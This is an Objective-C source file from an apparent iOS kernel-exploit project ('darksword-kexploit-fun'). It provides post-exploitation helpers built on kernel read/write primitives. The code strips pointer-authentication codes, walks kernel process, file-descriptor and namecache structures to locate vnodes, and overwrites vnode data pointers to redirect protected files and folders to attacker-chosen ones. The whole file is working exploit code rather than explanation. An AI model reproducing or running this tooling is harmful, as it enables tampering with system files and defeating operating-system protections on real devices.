//
//  vnode.m
//  darksword-kexploit-fun
//
//  Created by seo on 3/25/26.
//

#import "vnode.h"
#import "krw.h"
#import "kutils.h"
#import "offsets.h"
#import "xpaci.h"

#import <stdlib.h>
#import <unistd.h>
#import <fcntl.h>
#import <stdbool.h>
#import <string.h>
#import <Foundation/Foundation.h>

uint64_t get_vnode_for_path_by_chdir(const char *path) {
    if (access(path, F_OK) == -1) {
        return -1;
    }
    if (chdir(path) == -1) { return -1; }
    
    uint64_t fd_cdir_vp = kread64(proc_self() + off_proc_p_fd + off_filedesc_fd_cdir);
    chdir("/");
    return fd_cdir_vp;
}

uint64_t get_vnode_for_path_by_open(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) return -1;
    
    uint64_t fileprocPtrArr = kread64(proc_self() + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
    fp_glob = xpaci(fp_glob);
    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
    vnode = xpaci(vnode);
    
    close(fd);
    return vnode;
}

uint64_t get_vnode_by_fd(int fd) {
    uint64_t fileprocPtrArr = kread64(proc_self() + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
    fp_glob = xpaci(fp_glob);
    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
    vnode = xpaci(vnode);
    return vnode;
}

uint64_t get_rootvnode(void) {
    uint64_t launchd_proc = proc_find(1);
    uint64_t launchd_vnode = kread64(launchd_proc + off_proc_p_textvp);
    launchd_vnode = xpaci(launchd_vnode);
    
    uint64_t sbin_vnode = kread64(launchd_vnode + off_vnode_v_parent);
    sbin_vnode = xpaci(sbin_vnode);
    
    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent);
    root_vnode = xpaci(root_vnode);
    
    return root_vnode;
}

char vp_name[256];
char* vnode_get_v_name(uint64_t vnode) {
    memset(vp_name, 0, 256);
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    kreadbuf(vp_nameptr, &vp_name, 256);
    return vp_name;
}

uint64_t vnode_redirect_folder(const char *to, const char *from) {
    uint64_t to_vnode = get_vnode_for_path_by_chdir(to);
    uint64_t orig_to_v_data = kread64(to_vnode + off_vnode_v_data);
    uint64_t from_vnode = get_vnode_for_path_by_chdir(from);
    uint64_t from_v_data = kread64(from_vnode + off_vnode_v_data);
    
    kwrite64(to_vnode + off_vnode_v_data, from_v_data);
    
    return orig_to_v_data;
}

bool vnode_unredirect_folder(const char *folder, uint64_t orig_to_v_data) {
    uint64_t vnode = get_vnode_for_path_by_chdir(folder);
    if (vnode == -1) return false;
    
    kwrite64(vnode + off_vnode_v_data, orig_to_v_data);
    
    return true;
}

bool vnode_redirect_file(const char *to, const char *from, uint64_t* orig_to_vnode, uint64_t* orig_to_v_data) {
    uint64_t to_vnode = get_vnode_for_path_by_open(to);
    if(to_vnode == -1) {
        NSString *to_dir = [[NSString stringWithUTF8String:to] stringByDeletingLastPathComponent];
        NSString *to_file = [[NSString stringWithUTF8String:to] lastPathComponent];
        uint64_t to_dir_vnode = get_vnode_for_path_by_chdir(to_dir.UTF8String);
        to_vnode = vnode_get_child_vnode(to_dir_vnode, to_file.UTF8String, 0);
        if(to_vnode == -1) {
            printf("[-] Couldn't find file (to): %s", to);
            return false;
        }
    }
    
    uint64_t from_vnode = get_vnode_for_path_by_open(from);
    if(from_vnode == -1) {
        NSString *from_dir = [[NSString stringWithUTF8String:from] stringByDeletingLastPathComponent];
        NSString *from_file = [[NSString stringWithUTF8String:from] lastPathComponent];
        uint64_t from_dir_vnode = get_vnode_for_path_by_chdir(from_dir.UTF8String);
        from_vnode = vnode_get_child_vnode(from_dir_vnode, from_file.UTF8String, 0);
        if(from_vnode == 0) {
            printf("[-] Couldn't find file (from): %s", from);
            return false;
        }
    }
    
    *orig_to_vnode = to_vnode;
    *orig_to_v_data = kread64(to_vnode + off_vnode_v_data);
    uint64_t from_v_data = kread64(from_vnode + off_vnode_v_data);
    kwrite64(to_vnode + off_vnode_v_data, from_v_data);
    
    return true;
}

bool vnode_unredirect_file(uint64_t orig_to_vnode, uint64_t orig_to_v_data) {
    kwrite64(orig_to_vnode + off_vnode_v_data, orig_to_v_data);
    
    return true;
}
    
uint64_t vnode_get_child_vnode(uint64_t vnode, const char* child_filename, uint64_t blacklist_vdata) {
    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    if(vp_namecache == 0)   return -1;
    
    while(1) {
        if(vp_namecache == 0)   break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        
        if(vnode == 0)  break;
        char* vp_name = vnode_get_v_name(vnode);
        
        if(strcmp(vp_name, child_filename) == 0 && kread64(vnode + off_vnode_v_data) != blacklist_vdata) {
            return vnode;
        }
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_next);
    }
    
    return -1;
}
